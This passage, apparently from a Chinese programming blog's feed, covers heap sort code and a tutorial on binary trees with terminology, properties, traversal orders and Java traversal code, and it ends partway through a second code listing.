class="line"></span><br><span class="line"><span class="type">Date</span> <span class="variable">data2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">date2Str</span> <span class="operator">=</span> simpleDateFormat.format(data2);</span><br><span class="line">System.out.println(<span class="string">&quot;排序后的时间是=&quot;</span> + date2Str);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">heapSort</span><span class="params">(<span class="type">int</span>[] arr)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> arr.length / <span class="number">2</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">adjustHeap(arr, i, arr.length);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> arr.length - <span class="number">1</span>; j &gt; <span class="number">0</span>; j--) &#123;</span><br><span class="line">temp = arr[j];</span><br><span class="line">arr[j] = arr[<span class="number">0</span>];</span><br><span class="line">arr[<span class="number">0</span>] = temp;</span><br><span class="line">adjustHeap(arr, <span class="number">0</span>, j);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">adjustHeap</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> i, <span class="type">int</span> length)</span> &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">2</span> * i + <span class="number">1</span>; k &lt; length; k = <span class="number">2</span> * k + <span class="number">1</span>) &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[(k - <span class="number">1</span>) / <span class="number">2</span>];</span><br><span class="line"><span class="keyword">if</span> ((k + <span class="number">1</span>) &lt; length &amp;&amp; arr[k] &lt; arr[k + <span class="number">1</span>]) &#123;</span><br><span class="line">k++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (arr[k] &gt; temp) &#123;</span><br><span class="line">arr[(k - <span class="number">1</span>) / <span class="number">2</span>] = arr[k];</span><br><span class="line">arr[k] = temp;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>排序前的时间是=2020-08-10 19:18:24 排序后的时间是=2020-08-10 19:18:27</code></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> 数据结构和算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉树</title>
      <link href="/posts/2a0c/"/>
      <url>/posts/2a0c/</url>
      
        <content type="html"><![CDATA[<h1 id="树"><a href="#树" class="headerlink" title="树"></a>树</h1><p>树（Tree）是n(n&gt;&#x3D;0)个结点的有限集。n&#x3D;0时称为空树。</p><p>在任意一颗非空树中：</p><p>(1)<strong>有且仅有一个</strong>特定的称为根（Root）的结点。</p><p>(2)当n&gt;1时，其余结点可分为m(m&gt;0)个<strong>互不相交的有限集</strong>T1、T2、…..、Tm,其中每一个集合本身又是一棵树，并且称为根的子树（SubTree）。</p><h2 id="树的常用术语"><a href="#树的常用术语" class="headerlink" title="树的常用术语"></a>树的常用术语</h2><table><thead><tr><th>名称</th><th>含义</th></tr></thead><tbody><tr><td>节点</td><td>树中的数据元素</td></tr><tr><td>树的度</td><td>树内各节点的度的最大值</td></tr><tr><td>节点的度</td><td>节点拥有的子树的数目称为度，记作d(v)</td></tr><tr><td>叶子节点</td><td>节点的度数为0，称为叶子节点leaf、终端节点、末端节点</td></tr><tr><td>分支节点</td><td>节点度数不为0，称为非终端节点或分支节点</td></tr><tr><td>分支</td><td>节点之间的关系</td></tr><tr><td>内部节点</td><td>除根节点外的分支节点，当然也不包括叶子节点</td></tr><tr><td>孩子节点</td><td>节点的子树的根节点成为该节点的孩子</td></tr><tr><td>双亲节点</td><td>父节点，即该节点的前驱</td></tr><tr><td>兄弟节点</td><td>具有相同双亲节点的节点</td></tr><tr><td>祖先节点</td><td>从根节点到该节点所经分支上所有的节点。</td></tr><tr><td>子孙节点</td><td>节点的所有子树上的节点都成为该节点的子孙。</td></tr><tr><td>节点的层次</td><td>根节点为第一层，根的孩子为第二层，依次类推记作(Lv)</td></tr><tr><td>树的深度</td><td>节点的层次的最大值</td></tr><tr><td>堂兄弟</td><td>双亲在同一层的节点</td></tr><tr><td>有序树</td><td>结点的子树是有顺序的(兄弟有大小，有先后次序)，不能交换</td></tr><tr><td>无序数</td><td>结点的子树是无序的，可以交换</td></tr><tr><td>路径</td><td>树中的k个节点n1、n2、…nk，满足ni是n(i+1)的双亲，成为n1到nk的一条路径。就是一条线串下来的，前一个都是后一个父(前驱)节点。</td></tr><tr><td>森林</td><td>m(m≥0)课不相交的树的集合，对于节点而言，其子树的集合就是森林。</td></tr></tbody></table><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215711.png"></p><h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><p>二叉树（Binary Tree）是n（n&gt;&#x3D;0）个节点的有限集合，该集合可以为空集（称为空二叉树），或者由一个根节点和两个互不相交的、分别称为根节点的左子树和右子树的二叉树组成。</p><h2 id="二叉树的5种基本形态"><a href="#二叉树的5种基本形态" class="headerlink" title="二叉树的5种基本形态"></a>二叉树的5种基本形态</h2><ol><li>根节点既有左子树，又有右子树</li><li>根节点只有左子树</li><li>根节点只有右子树</li><li>只有一个根节点</li><li>空二叉树</li></ol><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200808114340.png"></p><h2 id="二叉树特点"><a href="#二叉树特点" class="headerlink" title="二叉树特点"></a>二叉树特点</h2><ol><li>每个节点最多有两个子树，所以二叉树不存在度大于2的节点，可以没有子树或者一个子树。</li><li>左子树和右子树有顺序，次序不能任意颠倒。</li><li>即使树中某节点只有一颗子树，也要区分是左子树还是右子树。</li></ol><h2 id="特殊二叉树"><a href="#特殊二叉树" class="headerlink" title="特殊二叉树"></a>特殊二叉树</h2><p><strong>斜树：</strong>所有的结点都只有左子树的二叉树叫左斜树。所有结点都是只有右子树的二叉树叫右斜树。这两者统称为斜树。</p><p>斜树有很明显的特点，就是每一层都只有一个结点，结点的个数与二叉树的深度相同。线性表结构就可以理解为是树的一种极其特殊的表现形式。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200808124224.png"></p><hr><p><strong>满二叉树：</strong>在一棵二叉树中，如果所有分支结点都存在左子树和右子树，并且所有叶子都在同一层上，这样的二叉树称为满二叉树。</p><p>满二叉树的特点有：<br>（1）叶子只能出现在最下一层。<br>（2）非叶子结点的度一定是2。<br>（3）在同样深度的二叉树中，满二叉树的结点个数最多，叶子数最多。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200808124236.png"></p><hr><p><strong>完全二叉树：</strong>对一棵具有n个结点的二叉树按层序编号，如果编号为i（1&lt;i&lt;n）的结点与同样深度的满二叉树中编号为i的结点在二叉树中位置完全相同，则这棵二叉树称为完全二叉树。</p><p>满二叉树一定是一棵完全二叉树，但完全二叉树不一定是满的。</p><p>完全二叉树的特点：<br>（1）叶子结点只能出现在最下两层。<br>（2）最下层的叶子一定集中在左部连续位置。<br>（3）倒数二层，若有叶子结点，一定都在右部连续位置。<br>（4）如果结点度为1，则该结点只有左孩子，即不存在只有右子树的情况。<br>（5）同样结点数的二叉树，完全二又树的深度最小。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200808124246.png"></p><h2 id="二叉树性质"><a href="#二叉树性质" class="headerlink" title="二叉树性质"></a>二叉树性质</h2><p>性质1：在二叉树的第i层上<strong>至多</strong>有2<sup>i-1</sup>个结点（i&gt;&#x3D;1）</p><p>性质2：深度为k的二叉树<strong>至多</strong>有2<sup>k</sup>-1个结点（k&gt;&#x3D;1）</p><p>性质3：对任何一棵二叉树T，如果其终端结点数为n0，度为2的结点数为n2，则n0 &#x3D; n2+1。</p><p>性质4：具有n个结点的完全二叉树的深度为[log<sub>2</sub>n ] + 1  ([X]表示不大于X的最大整数)。</p><p>性质5：如果对一颗有n个结点的完全二叉树的结点按层序编号（从第1层到第[log2n ] + 1层，每层从左到右），对任一结点 i (1&lt;&#x3D;i&lt;&#x3D;n)有：</p><ol><li>如果 i&#x3D;1，则结点i是二叉树的根，无双亲；如果 i&gt;1，则其双亲是结点[i&#x2F;2]。</li><li>如果 2i&gt;n,则结点i无左孩子（结点i为叶子结点）；否则其左孩子是结点2i。</li><li>如果 2i+1&gt;n,则结点i无右孩子；否则其右孩子是结点2i+1。</li></ol><p>结合下图理解：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200808124246.png"></p><h1 id="二叉树的遍历"><a href="#二叉树的遍历" class="headerlink" title="二叉树的遍历"></a>二叉树的遍历</h1><p>二叉树的遍历是指从根结点出发，按照某种次序依次访问二叉树中所有结点，使得每个结点被访问一次且仅被访问一次。</p><h2 id="前中后序遍历的介绍"><a href="#前中后序遍历的介绍" class="headerlink" title="前中后序遍历的介绍"></a>前中后序遍历的介绍</h2><p><strong>前序遍历：</strong>规则是若二叉树为空，则空操作返回，否则<strong>先访问根结点</strong>，然后前序遍历左子树，再前序遍历右子树。如图所示，遍历的顺序为：ABDGHCEIF。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200809104104.png"></p><hr><p><strong>中序遍历：</strong>规则是若树为空，则空操作返回，否则从根结点开始（注意并不是先访问根结点），中序遍历根结点的左子树，然后是<strong>访问根结点</strong>，最后中序遍历右子树。如图所示，遍历的顺序为：GDHBAEICF。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200809104459.png"></p><hr><p><strong>后序遍历：</strong>规则是若树为空，则空操作返回，否则从左到右的方式遍历访问左右子树，<strong>最后访问根结点</strong>。如图所示，遍历的顺序为：GHDBIEFCA。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20200809104945.png"></p><hr><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20220706215714.png"></p><h2 id="前中后序遍历的代码实现"><a href="#前中后序遍历的代码实现" class="headerlink" title="前中后序遍历的代码实现"></a>前中后序遍历的代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.tree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinaryTreeDemo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 先创建一颗二叉树</span></span><br><span class="line"><span class="type">BinaryTree</span> <span class="variable">binaryTree</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BinaryTree</span>();</span><br><span class="line"><span class="comment">// 创建需要的结点</span></span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">1</span>, <span class="string">&quot;宋江&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">2</span>, <span class="string">&quot;吴用&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">3</span>, <span class="string">&quot;卢俊义&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">4</span>, <span class="string">&quot;林冲&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">5</span>, <span class="string">&quot;关胜&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先手动创建该二叉树，后面学习递归的方式创建二叉树</span></span><br><span class="line">root.setLeft(node2);</span><br><span class="line">root.setRight(node3);</span><br><span class="line">node3.setRight(node4);</span><br><span class="line">node3.setLeft(node5);</span><br><span class="line">binaryTree.setRoot(root);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line">System.out.println(<span class="string">&quot;前序遍历&quot;</span>); <span class="comment">// 1,2,3,5,4</span></span><br><span class="line">binaryTree.preOrder();</span><br><span class="line">System.out.println(<span class="string">&quot;中序遍历&quot;</span>);</span><br><span class="line">binaryTree.infixOrder(); <span class="comment">// 2,1,5,3,4</span></span><br><span class="line">System.out.println(<span class="string">&quot;后序遍历&quot;</span>);</span><br><span class="line">binaryTree.postOrder(); <span class="comment">// 2,5,4,3,1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BinaryTree</span> &#123;</span><br><span class="line"><span class="keyword">private</span> HeroNode root;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRoot</span><span class="params">(HeroNode root)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.root = root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前序遍历</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.root != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.root.preOrder();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;二叉树为空，无法遍历&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中序遍历</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">infixOrder</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.root != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.root.infixOrder();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;二叉树为空，无法遍历&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后序遍历</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postOrder</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.root != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.root.postOrder();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;二叉树为空，无法遍历&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HeroNode</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="type">int</span> no;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> HeroNode left;</span><br><span class="line"><span class="keyword">private</span> HeroNode right;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">HeroNode</span><span class="params">(<span class="type">int</span> no, String name)</span> &#123;</span><br><span class="line"><span class="built_in">super</span>();</span><br><span class="line"><span class="built_in">this</span>.no = no;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getNo</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> no;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNo</span><span class="params">(<span class="type">int</span> no)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.no = no;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">getLeft</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLeft</span><span class="params">(HeroNode left)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.left = left;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> HeroNode <span class="title function_">getRight</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRight</span><span class="params">(HeroNode right)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.right = right;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;HeroNode [no=&quot;</span> + no + <span class="string">&quot;, name=&quot;</span> + name + <span class="string">&quot;]&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前序遍历</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preOrder</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="built_in">this</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.left.preOrder();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.right.preOrder();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中序遍历</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">infixOrder</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.left.infixOrder();</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="built_in">this</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.right.infixOrder();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 后序遍历</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postOrder</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.left != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.left.postOrder();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.right != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="built_in">this</span>.right.postOrder();</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="built_in">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="前中后序查找的代码实现"><a href="#前中后序查找的代码实现" class="headerlink" title="前中后序查找的代码实现"></a>前中后序查找的代码实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nanzx.tree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinaryTreeDemo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">// 先创建一颗二叉树</span></span><br><span class="line"><span class="type">BinaryTree</span> <span class="variable">binaryTree</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BinaryTree</span>();</span><br><span class="line"><span class="comment">// 创建需要的结点</span></span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">1</span>, <span class="string">&quot;宋江&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span class="variable">node2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HeroNode</span>(<span class="number">2</span>, <span class="string">&quot;吴用&quot;</span>);</span><br><span class="line"><span class="type">HeroNode</span> <span 